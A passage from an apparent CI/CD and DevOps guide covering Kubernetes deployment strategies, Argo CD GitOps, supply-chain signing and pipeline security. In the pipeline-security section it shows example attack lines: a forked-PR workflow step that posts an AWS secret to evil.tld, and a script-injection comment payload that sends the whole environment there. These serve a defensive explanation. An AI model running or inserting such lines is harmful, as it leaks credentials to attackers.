ROLLING            ▓▓▓▓▓▓▓▓░░  →  ▓▓▓▓▓░░░░░  →  ▓▓░░░░░░░░  →  ░░░░░░░░░░
                   old pods replaced by new ones, gradually.
                   ✅ zero downtime, no extra capacity, Kubernetes' default
                   ⛔ two versions run simultaneously → your API must be
                      backward-compatible during the rollout
                   ⛔ rollback = another rollout (slow)
                   ⛔ a bad version reaches 100% before you can react

BLUE-GREEN         ▓▓▓▓▓▓▓▓▓▓   ░░░░░░░░░░  →  ▓▓▓▓▓▓▓▓▓▓   ▓▓▓▓▓▓▓▓▓▓  →  switch
                   (blue live)  (green idle)     (both up)                  (green live)
                   ✅ instant cutover, instant rollback (flip back)
                   ✅ only ONE version serves traffic at a time
                   ⛔ needs 2× the capacity
                   ⛔ the database must support BOTH schema versions at once

CANARY             ▓▓▓▓▓▓▓▓▓░  →  ▓▓▓▓▓▓▓░░░  →  ▓▓▓▓▓░░░░░  →  ░░░░░░░░░░
                   (90/10)        (70/30)         (50/50)         (0/100)
                   ✅ a bad version hurts only a fraction of users
                   ✅ ⭐ combine with AUTOMATED METRIC ANALYSIS = progressive delivery
                   ⛔ needs traffic splitting (Ingress weights, a service mesh, or
                      an Argo Rollouts / Flagger controller)
                   ⛔ two versions in the fleet → backward compatibility required

SHADOW / MIRROR    ▓▓▓▓▓▓▓▓▓▓  →  users    ░░░░░░░░░░  ← a COPY of the same traffic
                   ✅ zero user risk — the new version's responses are DISCARDED
                   ✅ perfect for validating a rewrite against real traffic
                   ⛔ the new version must not have SIDE EFFECTS (no writes,
                      no emails, no charges) or you'll double-charge customers
                   ⛔ needs traffic mirroring (Istio, Envoy, nginx mirror)

A/B                ▓▓▓▓▓░░░░░  user segment A    ░░░░░▓▓▓▓▓  user segment B
                   ✅ a PRODUCT experiment, not a deployment safety technique
                   ⛔ needs sticky routing by user, and a metrics/experimentation stack
```

### 9.2 Kubernetes rolling update — the default, done right

```yaml
apiVersion: apps/v1
kind: Deployment
metadata: {name: shop-api, namespace: shop}
spec:
  replicas: 6
  revisionHistoryLimit: 5                 # ⭐ how many rollbacks are available
  minReadySeconds: 30                     # ⭐ a pod must stay Ready for 30s to count
  progressDeadlineSeconds: 600            # ⭐ after this, the rollout is marked failed
  strategy:
    type: RollingUpdate
    rollingUpdate:
      maxSurge: 1                         # ⭐ one EXTRA pod above the desired count
      maxUnavailable: 0                   # ⭐⭐ NEVER take a pod down before the new
                                          #    one is Ready. This is the zero-downtime setting.
  template:
    spec:
      terminationGracePeriodSeconds: 45   # ⭐ must exceed preStop + request drain
      containers:
        - name: api
          image: ghcr.io/3558bhk/shop-api@sha256:9f2a…   # ⭐ DIGEST, not a tag
          imagePullPolicy: Always
          startupProbe:                    # ⭐⭐ slow starters need this, or the
            httpGet: {path: /actuator/health/liveness, port: 9090}
            failureThreshold: 30           #    livenessProbe kills them during boot
            periodSeconds: 5
          readinessProbe:                  # ⭐ "can I take traffic RIGHT NOW?"
            httpGet: {path: /actuator/health/readiness, port: 9090}
            periodSeconds: 10
            timeoutSeconds: 3
            failureThreshold: 3
          livenessProbe:                   # ⭐ "should I be RESTARTED?" — keep it simple
            httpGet: {path: /actuator/health/liveness, port: 9090}
            periodSeconds: 20
            timeoutSeconds: 5
            failureThreshold: 3
          lifecycle:
            preStop:                        # ⭐⭐ the thing everyone forgets
              exec: {command: ["sh","-c","sleep 10"]}
              # sleep BEFORE the app shuts down, so the endpoint removal propagates
              # to every kube-proxy and ingress controller before connections stop.
              # Without it, you get a handful of 502s on EVERY deploy.
```

```bash
# watch a rollout
kubectl -n shop rollout status deploy/shop-api --timeout=300s
kubectl -n shop rollout history deploy/shop-api
kubectl -n shop rollout history deploy/shop-api --revision=4
kubectl -n shop describe deploy shop-api | grep -A5 'Conditions'
kubectl -n shop get rs -l app=shop-api --sort-by=.metadata.creationTimestamp

# ⭐ ROLLBACK — know these cold
kubectl -n shop rollout undo deploy/shop-api                      # to the previous revision
kubectl -n shop rollout undo deploy/shop-api --to-revision=4      # to a specific one
kubectl -n shop rollout restart deploy/shop-api                   # restart without changing the image
kubectl -n shop rollout pause deploy/shop-api                     # pause mid-rollout
kubectl -n shop rollout resume deploy/shop-api
kubectl -n shop set image deploy/shop-api api=ghcr.io/3558bhk/shop-api@sha256:OLD

# ⭐ Helm rollback (what you'll actually use)
helm history shop -n shop
helm rollback shop 12 -n shop --wait --timeout 5m
helm upgrade shop ./helm/shop -n shop --atomic --timeout 10m
# ⭐⭐ --atomic = automatically roll back if the upgrade fails or times out.
#    Always use it in a pipeline. Without it, a failed upgrade leaves you with
#    a half-applied release and a red pipeline and no automatic recovery.
```

### 9.3 Canary with Argo Rollouts ⭐ the production answer

```bash
kubectl create namespace argo-rollouts
kubectl apply -n argo-rollouts -f https://github.com/argoproj/argo-rollouts/releases/latest/download/install.yaml
kubectl argo rollouts version
```

```yaml
apiVersion: argoproj.io/v1alpha1
kind: Rollout
metadata: {name: shop-api, namespace: shop}
spec:
  replicas: 6
  revisionHistoryLimit: 5
  selector: {matchLabels: {app: shop-api}}
  strategy:
    canary:
      canaryService: shop-api-canary
      stableService: shop-api-stable
      # ⭐ traffic routing via the ingress
      trafficRouting:
        nginx:
          stableIngress: shop-ingress
      analysis:
        templates:
          - templateName: success-rate      # ⭐⭐ the automated gate
        startingStep: 2                     # begin analysing after the first increment
        args:
          - {name: service-name, value: shop-api-canary}
      steps:
        - setWeight: 10
        - pause: {duration: 5m}             # soak for 5 minutes at 10%
        - analysis: {templates: [{templateName: latency}]}
        - setWeight: 30
        - pause: {duration: 5m}
        - setWeight: 60
        - pause: {}                          # ⭐ an INDEFINITE pause = a manual gate
        - setWeight: 100
---
apiVersion: argoproj.io/v1alpha1
kind: AnalysisTemplate
metadata: {name: success-rate}
spec:
  args: [{name: service-name}]
  metrics:
    - name: success-rate
      interval: 60s
      count: 5                               # ⭐ 5 samples
      successCondition: result[0] >= 0.995   # ⭐⭐ the SLO, as a promotion gate
      failureLimit: 2                        # 2 failures → abort and roll back
      provider:
        prometheus:
          address: http://kps-kube-prometheus-stack-prometheus.monitoring.svc:9090
          query: |
            sum(rate(http_server_requests_seconds_count{application="{{args.service-name}}",status!~"5.."}[5m]))
            /
            sum(rate(http_server_requests_seconds_count{application="{{args.service-name}}"}[5m]))
    - name: latency-p99
      interval: 60s
      count: 5
      successCondition: result[0] <= 0.5
      failureLimit: 2
      provider:
        prometheus:
          address: http://kps-kube-prometheus-stack-prometheus.monitoring.svc:9090
          query: |
            histogram_quantile(0.99, sum by (le) (rate(
              http_server_requests_seconds_bucket{application="{{args.service-name}}"}[5m])))
    - name: error-count-vs-stable            # ⭐ compare canary against stable
      interval: 2m
      count: 3
      successCondition: result[0] < 1.2       # canary error rate < 1.2× the stable one
      failureLimit: 1
      provider:
        prometheus:
          address: http://kps-kube-prometheus-stack-prometheus.monitoring.svc:9090
          query: |
            (
              sum(rate(http_server_requests_seconds_count{application="{{args.service-name}}",status=~"5.."}[5m]))
              / clamp_min(sum(rate(http_server_requests_seconds_count{application="{{args.service-name}}"}[5m])),0.001)
            )
            /
            clamp_min(
              (
                sum(rate(http_server_requests_seconds_count{application="shop-api-stable",status=~"5.."}[5m]))
                / clamp_min(sum(rate(http_server_requests_seconds_count{application="shop-api-stable"}[5m])),0.001)
              ), 0.0001)
```

```bash
# ⭐ the pipeline just sets the image; Argo Rollouts does everything else
kubectl argo rollouts set image shop-api api=ghcr.io/3558bhk/shop-api@sha256:9f2a… -n shop
kubectl argo rollouts get rollout shop-api -n shop --watch
# Name:            shop-api
# Status:          ॥ Paused
# Message:         CanaryPauseStep
# Strategy:        Canary
#   Step:          2/8
#   SetWeight:     30
#   ActualWeight:  30
# Images:          ghcr.io/…@sha256:9f2a… (canary, 30%)
#                  ghcr.io/…@sha256:1c4d… (stable, 70%)
# Replicas:        Desired: 6   Current: 6   Updated: 2   Ready: 6   Available: 6

kubectl argo rollouts promote shop-api -n shop       # ⭐ pass the manual gate
kubectl argo rollouts abort   shop-api -n shop       # ⭐ roll back NOW
kubectl argo rollouts undo    shop-api -n shop
kubectl argo rollouts pause   shop-api -n shop
kubectl argo rollouts restart shop-api -n shop
kubectl argo rollouts list rollouts -n shop
kubectl argo rollouts dashboard                      # a local UI
```

**Flagger** is the alternative (from the Flux/CD community); it does the same thing with an Istio/Linkerd/nginx/App Mesh integration and its own `MetricTemplate` CRDs. Pick one: **Argo Rollouts** if you're on Argo CD; **Flagger** if you're on Flux.

### 9.4 Blue-green in Kubernetes

```yaml
# two Deployments, one Service, and a selector flip
apiVersion: v1
kind: Service
metadata: {name: shop-api, namespace: shop}
spec:
  selector:
    app: shop-api
    slot: blue                # ⭐ flip this to "green" to cut over
  ports: [{port: 80, targetPort: 8080}]
```

```bash
# ⭐ the cutover is ONE atomic command
kubectl -n shop patch svc shop-api -p '{"spec":{"selector":{"app":"shop-api","slot":"green"}}}'
# verify
kubectl -n shop get endpoints shop-api -o wide
./scripts/smoke-test.sh http://shop-api.shop.svc
# and the rollback is the same command with "blue"
kubectl -n shop patch svc shop-api -p '{"spec":{"selector":{"app":"shop-api","slot":"blue"}}}'
```

⚠️ **The blue-green database trap:** the DB schema must be compatible with **both** the old and the new application version simultaneously. That means **expand-and-contract migrations only**:

```
1. EXPAND    add the new column (nullable or with a default). Old code ignores it.
2. MIGRATE   dual-write from the new code. Backfill the old rows.
3. CONTRACT  in a LATER release, once nothing reads the old column, drop it.

⛔ NEVER: rename a column, drop a column, or change a type in the same release
   as the code that uses it. Blue-green (and rolling, and canary) all break.
```

---

<a name="10--gitops-push-vs-pull"></a>
## 10 · GitOps: push vs pull

### 10.1 The two models

```
PUSH (classic CI/CD)
  CI ──build──► registry
   └──deploy──► kubectl/helm ──► the cluster
                  ⭐ the CI system holds cluster-admin credentials

PULL (GitOps)
  CI ──build──► registry
   └──commit──► the CONFIG repo (bump the image digest)
                        │
                        ▼
              Git (the single source of truth)
                        ▲
                        │ the agent polls / watches
   the cluster ── Argo CD or Flux ──► reconciles itself to match Git
   ⭐ the cluster holds credentials to READ Git. Nothing outside can write to it.
```

| | **Push** | **Pull (GitOps)** |
|---|---|---|
| Where credentials live | ⛔ In the CI system — a compromise = cluster-admin | ✅ In the cluster, read-only to Git |
| The source of truth | The last pipeline run | ⭐ **Git** — auditable, diffable, revertable |
| Drift detection | None. Someone `kubectl edit`s and nobody knows. | ⭐ Continuous. The agent reverts it or flags it. |
| Rollback | Re-run an old pipeline | ⭐ `git revert` — one commit, fully auditable |
| Multi-cluster | N pipelines × N clusters | ⭐ One Git repo, N agents |
| Speed of feedback | Immediate (the pipeline tells you) | A few seconds of lag (the agent reports back) |
| Complexity | Low | ⭐⭐ You now operate Argo CD or Flux |
| Disaster recovery | Rebuild from your head | ⭐ Point a new cluster at the repo. Done. |

### 10.2 The Argo CD setup

```bash
kubectl create namespace argocd
kubectl apply -n argocd -f https://raw.githubusercontent.com/argoproj/argo-cd/stable/manifests/install.yaml
kubectl -n argocd rollout status deploy/argocd-server
kubectl -n argocd get secret argocd-initial-admin-secret -o jsonpath='{.data.password}' | base64 -d
kubectl -n argocd port-forward svc/argocd-server 8081:443 &
# log in at https://localhost:8081 (admin / the password above)

# the CLI
brew install argocd
argocd login localhost:8081 --insecure --username admin --password <pw>
argocd cluster add kind-cicd --name local
```

```yaml
# the Application — declarative, and itself in Git ⭐
apiVersion: argoproj.io/v1alpha1
kind: Application
metadata:
  name: shop-production
  namespace: argocd
  finalizers: [resources-finalizer.argocd.argoproj.io]
spec:
  project: shop
  source:
    repoURL: https://github.com/3558Bhk/shop-config.git
    targetRevision: main
    path: environments/production
    helm:
      valueFiles: [values.yaml, values-production.yaml]
      # ⭐ the image digest is written INTO values.yaml by the CI pipeline
  destination:
    server: https://kubernetes.default.svc
    namespace: shop
  syncPolicy:
    automated:
      prune: true                 # ⭐ delete resources removed from Git
      selfHeal: true              # ⭐⭐ revert manual kubectl changes automatically
    syncOptions:
      - CreateNamespace=true
      - ApplyOutOfSyncOnly=true
      - RespectIgnoreDifferences=true
      - ServerSideApply=true      # ⭐ avoids the "annotation too long" error
    retry:
      limit: 5
      backoff: {duration: 5s, factor: 2, maxDuration: 3m}
  revisionHistoryLimit: 20
  ignoreDifferences:               # ⭐ fields the cluster owns, not Git
    - group: apps
      kind: Deployment
      jsonPointers: [/spec/replicas]      # an HPA owns this
    - group: ""
      kind: ServiceAccount
      jsonPointers: [/imagePullSecrets]
---
apiVersion: argoproj.io/v1alpha1
kind: AppProject
metadata: {name: shop, namespace: argocd}
spec:
  description: The shop application
  sourceRepos: ['https://github.com/3558Bhk/shop-config.git']
  destinations:
    - {server: 'https://kubernetes.default.svc', namespace: 'shop'}
  clusterResourceWhitelist: []          # ⭐ no cluster-scoped resources
  namespaceResourceBlacklist:
    - {group: '', kind: ResourceQuota}
  roles:
    - name: developer
      description: read-only
      policies: [p, proj:shop:developer, applications, get, shop/*, allow]
    - name: ci
      description: may update the image
      policies:
        - p, proj:shop:ci, applications, update, shop/*, allow
        - p, proj:shop:ci, applications, sync, shop/*, allow
      groups: [shop-ci]
```

**The CI side becomes trivial — and much safer:**

```yaml
# ⭐ the deploy job no longer touches the cluster. It commits to Git.
deploy-production:
  environment: production
  permissions: {contents: write}          # ⭐ to push the config commit
  steps:
    - uses: actions/checkout@v7
      with:
        repository: 3558Bhk/shop-config     # ⭐ the CONFIG repo, not the app repo
        token: ${{ secrets.CONFIG_REPO_TOKEN }}
        path: config
    - name: Bump the image digest
      working-directory: config
      run: |
        DIGEST="${{ needs.build.outputs.digest }}"
        SHA="${{ github.sha }}"
        yq -i '.image.digest = strenv(DIGEST)' environments/production/values-production.yaml
        yq -i '.image.revision = strenv(SHA)'  environments/production/values-production.yaml
        git diff --exit-code && { echo "no change"; exit 0; }
        git config user.name  "shop-ci[bot]"
        git config user.email "shop-ci[bot]@users.noreply.github.com"
        git commit -am "deploy(production): shop-api@$DIGEST

        source: ${GITHUB_SERVER_URL}/${GITHUB_REPOSITORY}/commit/${SHA}
        run:    ${GITHUB_SERVER_URL}/${GITHUB_REPOSITORY}/actions/runs/${GITHUB_RUN_ID}
        approved-by: ${GITHUB_ACTOR}"
        git push
    # ⭐ Argo CD sees the commit within ~3 minutes (or instantly with a webhook)
    #    and reconciles the cluster. Nothing in this job can touch the cluster.
```

```bash
# ⭐ instant sync via a webhook instead of waiting for the 3-minute poll
# Argo CD → Settings → Webhook → add:
#   https://argocd.example.com/api/webhook  with the GitHub secret
kubectl -n argocd patch cm argocd-cm -p '{"data":{"webhook.github.secret":"<random>"}}'

argocd app list
argocd app get shop-production
argocd app diff shop-production              # ⭐ what Git wants vs what's running
argocd app sync shop-production --prune --timeout 300
argocd app history shop-production
argocd app rollback shop-production 14
argocd app logs shop-production
argocd app terminate-op shop-production
argocd app resources shop-production
```

**The repo layout that makes this work:**

```
shop-config/                     ⭐ a SEPARATE repo from the application code
├── base/                        the environment-independent truth
│   └── shop/
│       ├── Chart.yaml
│       ├── values.yaml
│       └── templates/…
├── environments/
│   ├── dev/
│   │   ├── values-dev.yaml
│   │   └── kustomization.yaml
│   ├── staging/
│   │   ├── values-staging.yaml
│   │   └── kustomization.yaml
│   └── production/
│       ├── values-production.yaml      ← ⭐ CI writes the image digest HERE
│       └── kustomization.yaml
├── argocd/
│   ├── app-of-apps.yaml                ← ⭐ one Application that creates the others
│   ├── projects/shop.yaml
│   └── applications/{dev,staging,production}.yaml
└── CODEOWNERS                          ← ⭐ production/ requires @sre-leads
```

> 🔑 **Why a separate config repo?** So that **write access to the production deploy config is a different permission from write access to the application source.** A developer can merge app code; only the SRE team (or a bot with a scoped token) can change what production runs. In one repo, those are the same permission, and that's how a junior engineer's typo reaches production.

---

<a name="11--software-supply-chain-security"></a>
## 11 · Software supply chain security

The question your pipeline must answer: **"How do I know that the thing running in production is the thing I built, from the source I reviewed, and that nobody tampered with it in between?"**

### 11.1 The chain, and where each link breaks

```
   SOURCE          BUILD           REGISTRY        DEPLOYMENT       RUNTIME
   ──────          ─────           ────────        ──────────       ───────
   the commit      the artifact    the image       the pod          the process
      │               │               │               │               │
      ⛔ a forced      ⛔ a tampered    ⛔ an overwritten ⛔ a mutated     ⛔ a runtime
         push to         build agent      tag              manifest         exploit
         main                            (same tag,
                                         new bytes)

   THE DEFENCES:
   ✅ signed commits   ✅ reproducible  ✅ signed images ✅ deploy by     ✅ a read-only
      + branch            builds +         + immutability   DIGEST, not      root filesystem
      protection          provenance       policies         a tag          + runtime scanning
```

### 11.2 SBOM — the Software Bill of Materials

```bash
# ⭐ generate it during the build, in the same step that builds the image
docker buildx build --sbom=true --provenance=mode=max --attest type=sbom \
  -t ghcr.io/3558bhk/shop-api:sha-a1b2c3d --push .

# or with syft/trivy directly
syft packages ghcr.io/3558bhk/shop-api:sha-a1b2c3d -o cyclonedx-json=sbom.cdx.json
syft packages ghcr.io/3558bhk/shop-api:sha-a1b2c3d -o spdx-json=sbom.spdx.json
trivy image --format cyclonedx --output sbom.cdx.json ghcr.io/3558bhk/shop-api:sha-a1b2c3d

# ⭐ and scan the SBOM itself (faster than re-scanning the image)
trivy sbom sbom.cdx.json
grype sbom.cdx.json

# inspect what's attached to an image
docker buildx imagetools inspect ghcr.io/3558bhk/shop-api:sha-a1b2c3d --format '{{json .Manifest}}' | jq .
# ⭐ you'll see a manifest LIST with the image + the attestation manifests
crane manifest ghcr.io/3558bhk/shop-api@sha256:… | jq .
```

| Format | Standard | Use it when |
|---|---|---|
| **SPDX** (JSON/YAML) | ISO/IEC 5962:2021, Linux Foundation | ⭐ You sell software / need a compliance artefact |
| **CycloneDX** | OWASP, ECMA-424 | ⭐ You're scanning for vulnerabilities (better tooling support) |

Generate **both** if you can; they're cheap.

### 11.3 Provenance and SLSA

**Provenance** is a signed statement of *how* the artifact was built: what source, what builder, what parameters, what dependencies.

```json
// a SLSA provenance predicate (in-toto / DSSE envelope)
{
  "builder": {"id": "https://github.com/slsa-framework/slsa-github-generator/.github/workflows/generator_container_slsa3.yml@refs/tags/v2.1.0"},
  "buildType": "https://slsa-framework.github.io/slsa-github-generator/container@v1",
  "invocation": {
    "configSource": {"uri": "git+https://github.com/3558Bhk/shop@refs/heads/main",
                     "digest": {"sha1": "a1b2c3d…"},
                     "entryPoint": ".github/workflows/release.yml"},
    "parameters": {"ref": "refs/heads/main"},
    "environment": {"github_event_name": "push"}
  },
  "metadata": {"buildStartedOn": "2026-09-10T09:14:02Z", "completeness": {…}},
  "materials": [{"uri": "git+https://github.com/3558Bhk/shop@refs/heads/main",
                 "digest": {"sha1": "a1b2c3d…"}}],
  "subject": [{"name": "ghcr.io/3558bhk/shop-api",
               "digest": {"sha256": "9f2a1b3c…"}}]
}
```

**SLSA levels** (Supply-chain Levels for Software Artifacts):

| Level | Requirement | How you get there |
|---|---|---|
| **L0** | Nothing | the default |
| **L1** | Provenance exists | `--provenance=true` on `docker buildx build` |
| **L2** | Provenance is **signed** by a hosted builder, and the source is versioned | ⭐ Build on a hosted CI (GitHub Actions/Azure Pipelines) with signing |
| **L3** | ⭐ The build is **hardened**: the builder is isolated, the provenance can't be forged by the user's workflow, and the source is auditable | Use the **SLSA GitHub Generator** (`slsa-framework/slsa-github-generator`) — it builds your artifact on a **runner the user's workflow cannot influence** |

```yaml
# ⭐ SLSA L3 for a container image, via the official generator
- uses: slsa-framework/slsa-github-generator/actions/generator/container_build@v2.1.0
  id: build
  with:
    images: ghcr.io/3558bhk/shop-api
    tags: ${{ steps.meta.outputs.version }}
    dockerfile: apps/shop-api/Dockerfile
    context: apps/shop-api
- uses: slsa-framework/slsa-github-generator/actions/generator/container_sign@v2.1.0
  with:
    image: ${{ steps.build.outputs.image }}
    digest: ${{ steps.build.outputs.digest }}
    registry-username: ${{ github.actor }}
    registry-password: ${{ secrets.GITHUB_TOKEN }}
```

### 11.4 Signing with cosign (sigstore)

```bash
# ⭐ KEYLESS signing — no key to manage. Uses OIDC + the public transparency log Rekor.
cosign sign ghcr.io/3558bhk/shop-api@sha256:9f2a1b3c…
# → an OIDC flow opens; the signature is recorded in Rekor.
#   In CI, the identity is the workflow's OIDC token — no secret at all.

# verify
cosign verify ghcr.io/3558bhk/shop-api@sha256:9f2a1b3c… \
  --certificate-oidc-issuer=https://token.actions.githubusercontent.com \
  --certificate-identity-regexp='https://github.com/3558Bhk/shop/.github/workflows/release.yml@refs/heads/main'
# ✅ Verification for ghcr.io/3558bhk/shop-api@sha256:… --
#    The following checks were performed:
#      ✅ The code repository is a valid public repo
#      ✅ The certificate chain is contained in the RFC3161 timestamp
#      ✅ The signature was verified against the Rekor transparency log

# attach and verify an SBOM
cosign attest --predicate sbom.cdx.json --type cyclonedx \
  ghcr.io/3558bhk/shop-api@sha256:9f2a…
cosign verify-attestation --type cyclonedx ghcr.io/3558bhk/shop-api@sha256:9f2a… \
  --certificate-oidc-issuer=https://token.actions.githubusercontent.com | jq -r .payload | base64 -d | jq .

# with a real key instead (for air-gapped or when you can't use Rekor)
cosign generate-key-pair
cosign sign --key cosign.key ghcr.io/…@sha256:…
cosign verify --certificate-identity … --key cosign.pub ghcr.io/…@sha256:…
```

```yaml
# ⭐ ENFORCE signatures at admission time — Kyverno or the cosign policy-controller
apiVersion: kyverno.io/v1
kind: ClusterPolicy
metadata: {name: verify-image-signature}
spec:
  validationFailureAction: Enforce          # ⭐ Enforce, not Audit, once you're confident
  background: false
  rules:
    - name: verify-signature
      match:
        any:
          - resources: {kinds: [Pod], namespaces: [shop]}
      verifyImages:
        - imageReferences: ["ghcr.io/3558bhk/*"]
          attestors:
            - entries:
                - keys:
                    publicKeys: |-
                      -----BEGIN PUBLIC KEY-----
                      …
                      -----END PUBLIC KEY-----
                  rekor:
                    url: https://rekor.sigstore.dev
                    ignoreTlog: false
          attestations:
            - predicateType: https://spdx.dev/Document
              conditions:
                all:
                  - key: .subject[0].name
                    operator: AnyIn
                    value: "ghcr.io/3558bhk/*"
```

> ⭐ **The point of all of this, in one sentence:** an unsigned image can be replaced in the registry by anyone who compromises the registry credentials, and nothing in your cluster would notice. A **signed** image, verified at **admission time**, cannot — and a `cosign verify` failure becomes a pod that simply won't schedule, with an audit trail in Rekor.

### 11.5 Dependency pinning — the boring part that prevents the worst incidents

```yaml
# ⛔ the supply-chain attack surface in a pipeline YAML:
steps:
  - uses: some-action/some-action@main          # ⛔⛔ a MOVING BRANCH. Anyone with
                                                #    write access can change what runs,
                                                #    with your secrets in scope.
  - uses: some-action/some-action@v2            # ⛔ a MOVING TAG. Same problem.
  - run: curl -sL https://example.com/x.sh | sh # ⛔⛔⛔ never do this
  - run: pip install requests                   # ⛔ unpinned → a new release can
                                                #    break or be malicious
  - run: npm install                            # ⛔ resolves from package-lock… if
                                                #    you committed it. Did you?

# ✅ the fixes:
  - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11   # v4.1.1 ⭐ pinned to a SHA
  - run: pip install -r requirements.txt        # with a hash-pinned requirements file
  - run: npm ci                                  # ⭐ ci, never install — respects the lockfile
```

```bash
# ⭐ pin your GitHub Actions to SHAs, and automate it
# the Renovate preset that does it:
{
  "extends": ["config:recommended", ":dependencyDashboard"],
  "packageRules": [
    {"matchManagers": ["github-actions"], "pinDigests": true, "automerge": true}
  ]
}
# or Pin's action-pinning helper:
npx pin-github-action .github/workflows/*.yml
# ⭐ and verify the SHA matches the tag you think it does:
git ls-remote https://github.com/actions/checkout refs/tags/v4.1.1
# b4ffde65f46336ab88eb53be808477a3936bae11	refs/tags/v4.1.1   ✅

# lockfiles: COMMIT THEM. All of them.
git ls-files | grep -E 'package-lock.json|go.sum|poetry.lock|requirements.txt|Cargo.lock|pom.xml'
# ⛔ if go.sum or package-lock.json is in .gitignore, your builds are not reproducible.
```

```dockerfile
# ⭐ pin your base images by DIGEST too
FROM eclipse-temurin:21-jre-alpine@sha256:8f2a…   AS runtime
# and make the digest updateable by Renovate/Dependabot:
#   dependabot.yml → package-ecosystem: docker, directory: /apps/shop-api
```

---

<a name="12--pipeline-security-the-attack-surface"></a>
## 12 · Pipeline security — the attack surface ⭐⭐

**Your CI system is a root-level credential.** It can read every secret, build arbitrary code, push images to your registry, and deploy to production. Treat it accordingly.

### 12.1 The five attacks, and the defence for each

#### Attack 1 — the `pull_request` secret exfiltration (pwn request)

```
An attacker FORKS your public repo.
They edit .github/workflows/ci.yml to add:
    - run: curl -XPOST https://evil.tld -d "$AWS_SECRET_ACCESS_KEY"
They open a pull request.
IF the workflow triggered by `pull_request` has secrets in scope → they have your keys.
```

**The defence — and GitHub gets this right by default:**

```
✅ `pull_request` from a FORK gets NO secrets and a READ-ONLY GITHUB_TOKEN.
⛔ `pull_request_target` DOES get secrets, and checks out the BASE branch by default.
   The classic mistake:
      on: pull_request_target
      steps:
        - uses: actions/checkout@v7
          with: {ref: ${{ github.event.pull_request.head.sha }}   # ⛔⛔⛔ NOW you've
        - run: npm ci && npm test                                  #   checked out and
                                                                   #   RUN attacker code
                                                                   #   WITH secrets.
   → This is "pwn request". It has compromised major projects.
   → The rule: with `pull_request_target`, NEVER check out and execute PR code
     in a job that has secrets.
```

```yaml
# ✅ the safe pattern for "test the PR AND have secrets": two workflows
# workflow A — runs on pull_request, NO secrets, builds and uploads the artifact
on: pull_request
permissions: {contents: read}              # ⭐ explicitly minimal
jobs:
  build:
    steps:
      - uses: actions/checkout@v7
      - run: npm ci && npm run build
      - uses: actions/upload-artifact@v4
        with: {name: build, path: dist/}

# workflow B — runs on workflow_run (triggered by A's completion), HAS secrets,
#              but only ever touches the ARTIFACT, never the PR source.
on:
  workflow_run:
    workflows: ["CI"]
    types: [completed]
permissions: {contents: read, pull-requests: write}
jobs:
  report:
    if: github.event.workflow_run.conclusion != 'skipped'
    steps:
      - uses: actions/download-artifact@v4
        with: {name: build, run-id: '${{ github.event.workflow_run.id }}',
               github-token: '${{ secrets.GITHUB_TOKEN }}'}
      - run: ./scripts/report.sh            # ⭐ no untrusted source here
```

```yaml
# Azure DevOps: the equivalent control
# ⭐ Project Settings → Pipelines → "Forks and upstreams":
#    · Build pull requests from forks:  ON
#    · "Make secrets available to builds of forks":  ⛔ OFF   ← the critical setting
#    · Enforce job authorization scope: ON
#      (a build can only use the credentials of the CURRENT project)
# and for GitHub repos connected to Azure DevOps:
#    · "Build GitHub repositories securely by default" — ON
```

```groovy
// Jenkins: the equivalent control
// ⛔ NEVER give a multibranch or PR job access to production credentials.
// The GitHub Branch Source plugin has:
//    "Suppress automatic SCM triggering" for PRs from forks
//    and you scope credentials by FOLDER:
//       Manage Jenkins → Credentials → (folder: shop-pr-builds)  ← no prod creds here
//       Manage Jenkins → Credentials → (folder: shop-main)       ← prod creds here
// and in the Jenkinsfile:
properties([
  // ⭐ only run PR builds from forks with a restricted agent and no credentials
  pipelineTriggers([[$class: 'GitHubPushTrigger']])
])
// ⚠️ Jenkins' weak spot: a `Jenkinsfile` in a PR can call ANY plugin step, and
//    many plugins execute on the CONTROLLER. A malicious Jenkinsfile can read
//    files outside the workspace. Mitigate with:
//      · the Script Security plugin's approval queue (never auto-approve)
//      · sandboxed pipelines (the default for Jenkinsfile-from-SCM)
//      · ⭐ restricting which plugins are callable from a Jenkinsfile:
//        Manage Jenkins → Security → "Script approval" + the
//        "Access Control for Builds" / Folder-based restrictions
```

#### Attack 2 — script injection ⭐ the most common real leak

```yaml
# ⛔⛔⛔ NEVER interpolate an untrusted value directly into a shell command.
# GitHub expands ${{ }} BEFORE the shell sees it, so this becomes:
on: issue_comment
jobs:
  x:
    steps:
      - run: echo "Processing ${{ github.event.comment.body }}"
        # if the comment is:   "; curl evil.tld -d $(env) ; #
        # the executed command is:
        #   echo "Processing "; curl evil.tld -d $(env) ; #"
        # ⛔ every secret in the environment just went to the attacker.

# The same works with: PR titles, branch names, commit messages, file contents,
# issue bodies, and review comments. ALL of them are attacker-controlled.
```

```yaml
# ✅ THE FIX: put it in an ENV VAR and let the SHELL expand it.
steps:
  - name: Safe
    env:
      COMMENT_BODY: ${{ github.event.comment.body }}      # ⭐ env, not interpolation
    run: echo "Processing $COMMENT_BODY"                  # the shell quotes it correctly

# ✅ and for values you must validate, validate first:
  - name: Validate the branch name
    env:
      REF: ${{ github.head_ref }}
    run: |
      if [[ ! "$REF" =~ ^[a-zA-Z0-9._/-]+$ ]]; then
        echo "✖ suspicious branch name: $REF"; exit 1
      fi
```

```yaml
# Azure DevOps: same trap, different syntax
# ⛔ script: echo "$(Build.SourceVersionMessage)"     — the commit message is interpolated
# ✅ the safer form: map it to an environment variable first
steps:
  - script: echo "$COMMIT_MESSAGE"
    env:
      COMMIT_MESSAGE: $(Build.SourceVersionMessage)
# ⭐ Azure DevOps also has: "Prevent unintended pipeline runs" and
#    macro/runtime-expression/template-expression distinctions — learn which is which.
```

```groovy
// Jenkins: same trap
// ⛔ sh "echo ${params.USER_INPUT}"        — Groovy interpolates BEFORE the shell
// ✅ sh 'echo "$USER_INPUT"'               — single quotes: the shell expands it
environment { USER_INPUT = "${params.USER_INPUT}" }
```

#### Attack 3 — the self-hosted runner on a public repo

```
⛔⛔⛔ THE MOST DANGEROUS CONFIGURATION IN CI.
A public repo + a self-hosted runner = anyone on the internet can open a PR
that runs ARBITRARY CODE ON YOUR MACHINE, which persists after the job ends.
They can read every file the runner user can read, install a backdoor,
pivot into your network, and steal the credentials cached on that machine.
```

**The rules:**
```
1. ⛔ NEVER attach a self-hosted runner to a PUBLIC repository.
2. If you must, set it to EPHEMERAL (--ephemeral: one job, then it deregisters).
3. Fork the public repo to a private one and run CI there instead.
4. Require approval for first-time contributors:
     Settings → Actions → General → "Fork pull request workflows from outside collaborators"
       → Require approval for all outside collaborators    ⭐
